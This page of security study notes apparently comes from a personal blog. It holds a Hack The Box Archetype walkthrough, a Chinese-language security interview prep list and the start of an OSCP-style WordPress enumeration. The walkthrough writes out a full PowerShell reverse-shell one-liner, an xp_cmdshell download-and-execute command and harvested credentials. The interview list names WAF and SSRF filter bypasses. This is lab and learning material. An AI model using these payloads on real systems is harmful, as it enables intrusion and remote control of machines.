plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate&#x3D;1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d &#39;&#x2F;&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s&#x2F;,$&#x2F;&#x2F; &gt;&gt; ports.txt</span><br><span class="line"></span><br><span class="line">tr: change \n to ,</span><br><span class="line">sed s&#x2F;,$ replace the last &#96;,&#96; to empty</span><br></pre></td></tr></table></figure>
<p>more detailed scan</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p&#96;cat ports.txt&#96; 10.10.10.27</span><br></pre></td></tr></table></figure>
<p>Results:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">135&#x2F;tcp   open     msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open     netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open     microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433&#x2F;tcp  open  ms-sql-s Microsoft SQL Server 2017 </span><br><span class="line">5985&#x2F;tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">47001&#x2F;tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49665&#x2F;tcp filtered unknown</span><br><span class="line">49667&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49668&#x2F;tcp open     msrpc        Microsoft Windows RPC</span><br><span class="line">49669&#x2F;tcp closed   unknown</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 445: Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet.</span><br></pre></td></tr></table></figure>
<p>445 are open (file sharing smb)</p>
<p>check anonymous login</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\10.10.10.27 </span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	backups         Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line"></span><br><span class="line">-N: dot not ask for password</span><br><span class="line">-L: list shares</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N \\\\10.10.10.27\\backups</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  ..                                  D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020</span><br><span class="line"></span><br><span class="line">		10328063 blocks of size 4096. 8248806 blocks available</span><br><span class="line">get prod.dtsConfig</span><br></pre></td></tr></table></figure>

<p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy&#x3D;&quot;...&quot; GeneratedFromPackageName&#x3D;&quot;...&quot; GeneratedFromPackageID&#x3D;&quot;...&quot; GeneratedDate&#x3D;&quot;20.1.2019 10:01:34&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType&#x3D;&quot;Property&quot; Path&#x3D;&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType&#x3D;&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source&#x3D;.;Password&#x3D;M3g4c0rp123;User ID&#x3D;ARCHETYPE\sql_svc;Initial Catalog&#x3D;Catalog;Provider&#x3D;SQLNCLI10.1;Persist Security Info&#x3D;True;Auto Translate&#x3D;False;&lt;&#x2F;ConfiguredValue&gt;</span><br><span class="line">    &lt;&#x2F;Configuration&gt;</span><br><span class="line">&lt;&#x2F;DTSConfiguration&gt;</span><br></pre></td></tr></table></figure>

<p>port 1433 is default port for ms-sql-s</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27 -windows-auth</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>entered the database</p>
<p>check weather the current user has system level privilege</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><br><span class="line">              </span><br><span class="line"></span><br><span class="line">-----------   </span><br><span class="line"></span><br><span class="line">          1 </span><br></pre></td></tr></table></figure>

<p>change configuration to make xp_cmdshell available:<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;Show Advanced Options&#39;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>xp_cmdshell:<br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15</a></p>
<p>powershell reverse shell:<br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reverseshell.ps</span><br><span class="line"></span><br><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.73&#39;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.73&quot;,4242);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;# &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>

<p>open a webserver for servering the file</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">listening for the reverse shell:</span><br><span class="line">nc -vnlp 4242</span><br></pre></td></tr></table></figure>

<p>in sql execute:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http:&#x2F;&#x2F;10.10.14.73&#x2F;ps_shell2.ps1\&quot;);&quot;</span><br></pre></td></tr></table></figure>

<p>not sure why the first script get blocked by antivirus software</p>
<p>the flag file stored in :C:\Users\sql_svc\Desktop\user.txt</p>
<p>privilege escalation:</p>
<p>find frequent accessed file or commands:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups &#x2F;user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Net_(command)">https://en.wikipedia.org/wiki/Net_(command)</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use: Connect&#x2F;disconnect computer to&#x2F;from shared resources, or display information about computer connections</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>connect to the admin user and look at the desktop</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py administrator@10.10.10.27</span><br><span class="line"></span><br><span class="line">cd C:\Users\administrator\Desktop</span><br></pre></td></tr></table></figure>

<p>to use psexec, port445 need to open </p>
<p>Prerequisites:</p>
<ul>
<li>A modern Windows computer (local)</li>
<li>File and Printer Sharing open (remote computer, TCP port 445)</li>
<li>The admin$ administrative share available (remote computer)</li>
<li>You know a local account’s credential (remote computer)</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/04/Interview-Preparation/">Security Interview Preparation</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-03</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Security/">Security</a></span><div class="content"><p>以下代码中存在什么漏洞？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.nio.file.*;</span><br><span class="line">public class ReadFile extends HttpServlet&#123;</span><br><span class="line">    protected void test(HttpServletRequest request, HttpServletResponse response) throws IOException&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">            String data &#x3D; new String(Files.readAllBytes(Paths.get(url)));</span><br><span class="line">        &#125;catch(IOException e)&#123;</span><br><span class="line">            PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">            out.print(&quot;File not found&quot;);</span><br><span class="line">            out.flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>答案：</p>
<ul>
<li>本地文件包含 LFI</li>
<li>服务器请求伪造 SSRF: Path.get(url) and readAllbytes(), when url is a remote url </li>
<li>UNC path 注入, Path.get() can also parse UNC path: <ul>
<li><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/v9Om">近期Zoom安全问题频繁进入安全圈的视野</a></li>
<li>Windows就会尝试使用SMB文件共享协议连接到远程站点来打开一个远程文件, 默认情况下，Windows会发送用户的login用户名和NTLM password哈希值. 可以修改组策略： Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers 为 deny all</li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/372961591">纯干货-内网渗透系列教程——NTLM 与 NTLM 身份认证</a></li>
</ul>
</li>
</ul>
<p>sql注入中报错注入常用的函数有:</p>
<ul>
<li>floor():<ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></li>
</ul>
</li>
<li>updatexml()<ul>
<li>updatexml():是mysql对xml文档数据进行查询和修改的xpath函数, updatexml(xml_document,XPthstring,new_value), xpath must be valid path, concat(0x7e, database()), 0x7e is <code>~</code>, is an invalid xpath format</li>
</ul>
</li>
<li>extractvalue()<ul>
<li>similar to updatexml(), takes an xpath arg</li>
</ul>
</li>
<li>exp()<ul>
<li>return error when argument &gt; 709, <code>~0</code> always &gt; 709, usually a statement returns 0. so try <code>exp~(select version())</code> will return error, and sometimes the <code>version()</code> in error message will be evluated</li>
</ul>
</li>
</ul>
<p>以下哪个操作在Linux 下需要 root 权限:</p>
<ul>
<li><code>iptables -t nat -L</code> </li>
<li><code>nc -l -p 1024</code> (不需要， 因为是listen在&gt;=1024的port上，不属于privileged port)</li>
</ul>
<p>以下哪些属于缓冲区溢出保护手段？</p>
<ul>
<li>PIE, -fPIE, position independent executable, is used to support ASLR</li>
<li>NX, none executable page</li>
<li>Stack Canary</li>
</ul>
<p>不属于：SE(secure element):</p>
<p>PHP变量覆盖：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34486302/article/details/115153306">php中哪些函数使用不当会导致变量覆盖,PHP变量覆盖漏洞小结</a></p>
<ul>
<li>extract(),  parse_str(), import_request_variables()</li>
</ul>
<p>redis未授权的利用方法包括以下哪几种:</p>
<ul>
<li>写入ssh秘钥</li>
<li>向web目录中写入webshell</li>
<li>向crontab中写入计划任务</li>
</ul>
<p>APK V1 签名v1 仅针对单个 ZIP 条目进行验证</p>
<p>Cookie 中的secure属性代表什么：</p>
<ul>
<li>secure属性可防止信息在传递的过程中被监听捕获后导致信息泄露，如果设置为true，可以限制只有通过https访问时，才会将浏览器保存的cookie传递到服务端，如果通过http访问，不会传递cookie。</li>
<li>httpOnly属性可以防止程序获取cookie，如果设置为true，通过js等将无法读取到cookie，能有效的防止XSS攻击</li>
</ul>
<p>CC攻击：Challenge Collapsar Attack， DDoS的一种</p>
<p>Web Application Firewall<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结</a></p>
<ul>
<li>编码绕过</li>
<li>字母大小写转换绕过</li>
<li>空格过滤绕过 (使用空白符或者<code>+</code>)</li>
<li>双关键字绕过</li>
<li>内联注释绕过</li>
<li>请求方式差异规则松懈性绕过 (例如用Post代替Get)</li>
<li>异常Method绕过 （DigAPi）,similar to the above</li>
<li>超大数据包绕过</li>
<li>复参数绕过</li>
<li>添加%绕过过滤</li>
<li>协议未覆盖绕过</li>
<li>宽字节绕过</li>
<li>%00截断<br>。。。。等等</li>
</ul>
<p>以下哪个工具可以拦截和修改数据包：</p>
<ul>
<li>Burpsuite</li>
<li>Fiddler</li>
</ul>
<p>防御CSRF漏洞:</p>
<ul>
<li>校验referer</li>
<li>请求中添加token</li>
<li>验证码 </li>
</ul>
<p>SSRF： Server-side request Forgery (<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a>)<br>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() / fsockopen() / curl_exec() 等。</p>
<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP<br>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
<ul>
<li>8进制格式：0300.0250.0.1</li>
<li>16进制格式：0xC0.0xA8.0.1</li>
<li>10进制整数格式：3232235521</li>
<li>16进制整数格式：0xC0A80001</li>
<li>合并后两位：1.1.278 / 1.1.755</li>
<li>合并后三位：1.278 / 1.755 / 3.14159267</li>
</ul>
<p>产生死锁的四个必要条件：</p>
<ul>
<li>互斥条件：一个资源每次只能被一个进程使用。</li>
<li>请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。</li>
<li>不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺。</li>
<li>循环等待条件:若干进程之间形成一种头尾相接的循环等待资源关系。<br>这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35180983/article/details/82665269">DSA与RSA</a></p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">浅析DOM型XSS</a> 不会与后台产生交互</p>
<p>参数化查询防范sql注入(parameterized query)<br>e.g.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO myTable (c1, c2, c3, c4) VALUES (@c1, @c2, @c3, @c4)</span><br><span class="line">UPDATE myTable SET c1 &#x3D; ?, c2 &#x3D; ?, c3 &#x3D; ? WHERE c4 &#x3D; ?</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/articles/833518860d4664d9e8d835c7195571ab.html">/var/log目录下的20个Linux日志文件功能详解</a></p>
<p>hydra 是一款爆破工具</p>
<p>数学家冯·诺依曼提出了计算机制造的三个基本原则，即采用二进制逻辑、程序存储执行以及计算机由五个部分组成（运算器、控制器、存储器、输入设备、输出设备），这套理论被称为冯·诺依曼体系结构。</p>
<p>越权：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ec517c3df7cd">越权（水平越权和垂直越权）</a>（Broken Access Control，简称BAC）</p>
<p>以下命令可以用来在Linux中查看selinux状态的是:<br><code>getenforce</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr - convert text files for printing</span><br></pre></td></tr></table></figure>
<p>Usual Linux: DAC (Discretionary Access Control)</p>
<ul>
<li>Users are allowed to alter the access contorol lists on objects they own<br>SELinux: MAC (Mandatory Access Control)</li>
<li>The system (admin) sets up the access control lists and users have no control over changing the list</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30483108">SELinux 入门</a></p>
<p>XSS 防御：<br>htmlspecialchars:可以把输入内容转换为HTML实体.</p>
<p>RCE Remote code execution</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/11/OSCP-Exam-Tips/">OSCP Exam Tips</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-11</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OSCP/">OSCP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="During-the-exam"><a href="#During-the-exam" class="headerlink" title="During the exam"></a>During the exam</h1><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qiXPM4O427A">https://www.youtube.com/watch?v=qiXPM4O427A</a>  </p>
<ol>
<li>organize your notes and know what machine you need to target what their point values are </li>
<li>star up auto recon for the four machines excluding the buffer overflow and move on the buffer overflow (scan should be done within the first hour)</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/11/Study-Notes-2021-07-11/">Study Notes - 2021/07/11</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-11</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Penetration-Example"><a href="#Penetration-Example" class="headerlink" title="Penetration Example"></a>Penetration Example</h1><h1 id="Add-host-name-Optional"><a href="#Add-host-name-Optional" class="headerlink" title="Add host name (Optional)"></a>Add host name (Optional)</h1><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sC -sS -p0-65535 sandbox.local</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-11 12:49 EDT</span><br><span class="line">Nmap scan report for sandbox.local (10.11.1.250)</span><br><span class="line">Host is up (0.025s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22&#x2F;tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 86:8f:89:36:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)</span><br><span class="line">|   256 de:f3:84:f1:cd:f3:c8:9a:30:6d:60:e8:b1:1d:99:27 (ECDSA)</span><br><span class="line">|_  256 14:6a:ba:77:e0:57:e5:0c:c0:cc:76:31:91:8d:dd:9f (ED25519)</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-title: SandBox &amp;#8211; See the future, Feel the shine</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 126.77 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>autorecon: <code>autorecon -t target.txt</code></p>
<h2 id="targeting-the-web-application"><a href="#targeting-the-web-application" class="headerlink" title="targeting the web application"></a>targeting the web application</h2><p>nmap scan indicate the webpage generated by wordpress5.3, looking for themes and plugins, may become our target.</p>
<p>Perform a basic directory brute force to discover any sensitive files and confirm it is actually wordpress.</p>
<p>autorecon results are stored in “resutls/scan/tcp_80_http_feroxbuster.txt”, autorecon uses <code>feroxbuster</code><br>Some common wordpress directory in the target:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">301        9l       28w      317c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-admin</span><br><span class="line">301        9l       28w      319c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-blog-header.php</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-config.php</span><br><span class="line">301        9l       28w      320c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-includes</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-cron.php</span><br><span class="line">200       11l       23w      220c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-links-opml.php</span><br><span class="line">200        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-load.php</span><br><span class="line">200       91l      324w     4874c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-login.php</span><br><span class="line">403      121l      315w     2709c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-mail.php</span><br><span class="line">302        0l        0w        0c http:&#x2F;&#x2F;sandbox.local&#x2F;wp-signup.php</span><br></pre></td></tr></table></figure>
<p>the tutorial uses dirb:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;sandbox.local</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-content&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;sandbox.local&#x2F;wp-includes&#x2F;</span><br></pre></td></tr></table></figure>
<p>dirb seems did some recursive search under each directory</p>
<p>use wp scan for wordpress vul scan:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o wpscan.txt -f cli-no-color</span><br></pre></td></tr></table></figure>
<p>(–enumerate) to include “All Plugins” (ap), “All Themes” (at), “Config backups” (cb), and “Db exports” (dbe).</p>
<p>Found some plugins</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elementor</span><br><span class="line">ocean-extra</span><br><span class="line">wp-survey-and-poll</span><br></pre></td></tr></table></figure>

<p>Use searchsploit to search for vulns, first search their name, but nonthing found</p>
<p>search for survey and poll</p>
